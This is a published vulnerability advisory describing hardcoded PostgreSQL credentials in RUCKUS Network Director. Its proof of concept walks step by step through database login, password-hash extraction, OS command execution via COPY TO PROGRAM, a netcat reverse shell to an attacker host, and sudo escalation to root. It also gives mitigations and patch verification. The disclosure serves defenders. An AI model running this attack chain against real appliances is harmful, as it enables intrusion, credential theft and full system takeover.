# RUCKUS Network Director: Hardcoded PostgreSQL Credentials Allow Remote OS Command Execution

- **Advisory ID:** MCSAID-2025-009
- **CVE ID:** CVE-2025-67304
- **Product:** RUCKUS Network Director (https://support.ruckuswireless.com/products/156-ruckus-network-director-rnd#f-product-facet=RND)
- **Reported:** 2025-09-23
- **Published:** 2025-10-31
- **Severity:** High (8.8)
- **CWE:** [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- **Discovered by:** Ivan Racic of Marlink Cyber

---

## Summary

The RUCKUS Network Director OVA appliance contains hardcoded credentials for the `ruckus` PostgreSQL database user. In the default configuration, the PostgreSQL service is accessible over the network on TCP port 5432. An attacker can use the hardcoded credentials to authenticate remotely, gaining superuser access to the database. This allows creation of administrative users for the web interface, extraction of password hashes, and execution of arbitrary OS commands as the `postgres` user via PostgreSQL's `COPY TO PROGRAM` functionality.

---

## Affected Versions

| Version                                       | Status                    |
| --------------------------------------------- | ------------------------- |
| RUCKUS Network Director < 4.5.0.54            | Vulnerable                |
| RUCKUS Network Director 4.5.0.54              | Patched                   |

---

## Proof of Concept

### 1. Network Exposure

The PostgreSQL service is exposed on the network in the default configuration:

```
$ nmap -sV <target> -p5432 -T4 -n
Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-23 22:55 +0200
Nmap scan report for <target>
Host is up (0.012s latency).

PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL DB 14.0
```

### 2. Hardcoded Credentials

The hardcoded credentials are stored in `/opt/ruckuswireless/rnd/config/config.json`:

```json
{
    "production": {
        "username": "ruckus",
        "password": "<REDACTED>",
        "database": "ruckus",
        "host": "127.0.0.1",
        "port": 9999,
        "dialect": "postgres"
    }
}
```

### 3. Database Access

Using the hardcoded credentials, an attacker can authenticate to the PostgreSQL service with superuser privileges:

```
$ psql -h <target> -U ruckus -d ruckus
Password: <REDACTED>

ruckus=# \du
                                   List of roles
 Role name |                         Attributes                         | Member of
-----------+------------------------------------------------------------+-----------
 pgpool    | Superuser, Create role, Create DB                          | {}
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
 repl      | Replication                                                | {}
 ruckus    | Superuser, Create role, Create DB                          | {}
```

### 4. Extracting User Credentials

The attacker can extract password hashes from the `users` table:

```
ruckus=# SELECT username, email, password FROM users;
 username |          email          |                              password
----------+-------------------------+----------------------------------------------------------------------
 admin    | admin@example.com       | 6d20ced02e134...
(1 row)
```

### 5. OS Command Execution

Using PostgreSQL's `COPY TO PROGRAM` functionality, the attacker can execute arbitrary OS commands:

```
ruckus=# COPY (SELECT '') TO PROGRAM 'id';
COPY 1

ruckus=# CREATE TEMP TABLE cmdout(line text);
CREATE TABLE

ruckus=# COPY cmdout FROM PROGRAM 'id';
COPY 1

ruckus=# SELECT * FROM cmdout;
                         line                          
-------------------------------------------------------
 uid=26(postgres) gid=26(postgres) groups=26(postgres)
(1 row)
```

### 6. Reverse Shell

Netcat is present on the appliance, allowing a reverse shell:

```
ruckus=# COPY (SELECT '') TO PROGRAM 'nc <attacker_ip> 4444 -e /bin/bash';
```

On the attacker's machine:

```
$ nc -klnvp 4444
listening on [any] 4444 ...
connect to [<attacker_ip>] from (UNKNOWN) [<target>] 58042
id
uid=26(postgres) gid=26(postgres) groups=26(postgres)
uname -a
Linux ruckuspwn 3.10.0-1160.119.1.el7.x86_64 #1 SMP Tue Jun 4 14:43:51 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

### 7. Privilege Escalation to Root

If the attacker can obtain or crack the `admin` user's password (from the database hash or password reuse), full root access is possible due to sudo configuration:

```
bash-4.2$ su admin --shell=/bin/bash
Password: ********
$ sudo su -
# id
uid=0(root) gid=0(root) groups=0(root)
```

The `/etc/sudoers` configuration grants passwordless sudo to the `admin` user:

```
admin ALL=(ALL) NOPASSWD:ALL
sshuser ALL=(ALL) NOPASSWD:ALL
```

---

## Impact

An attacker with network access to the PostgreSQL service can:

- Authenticate with superuser database privileges
- Extract password hashes from the `users` table
- Create administrative users for the web interface (TCP 8443)
- Execute arbitrary OS commands as the `postgres` user
- Obtain a remote shell on the system
- Potentially escalate to root if the admin password is compromised or reused

---

## Mitigations

* Update to RUCKUS Network Director version 4.5.0.54 or later.
* Restrict network access to the PostgreSQL port (TCP 5432).
* Audit existing deployments for unauthorized database users.
* Ensure unique, strong passwords are used for all accounts.

---

## Patch Verification

In version 4.5.0.54:

1. The PostgreSQL service is no longer network-accessible (bound to localhost only).
2. Database passwords are now randomly generated during installation, unique per deployment.

```
$ nmap -Pn <target> -T4 -n -p0-65535 -sV --open
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        OpenResty web app server 1.19.3.1
443/tcp  open  ssl/http    OpenResty web app server 1.19.3.1
2000/tcp open  cisco-sccp?
5060/tcp open  sip?
8443/tcp open  ssl/http    OpenResty web app server 1.19.3.1
```

PostgreSQL (5432) is no longer exposed.

---

## References

* Vendor Advisory: [RUCKUS Network Director: Critical Security Bypass Vulnerability Leading to
Remote Code Execution and shell Access](https://webresources.commscope.com/download/assets/RUCKUS+Network+Director%3A+Critical+Security+Bypass+Vulnerability+Leading+to+Remote+Code+Execution+and/3adeb3acb69211f08a46b6532db37357)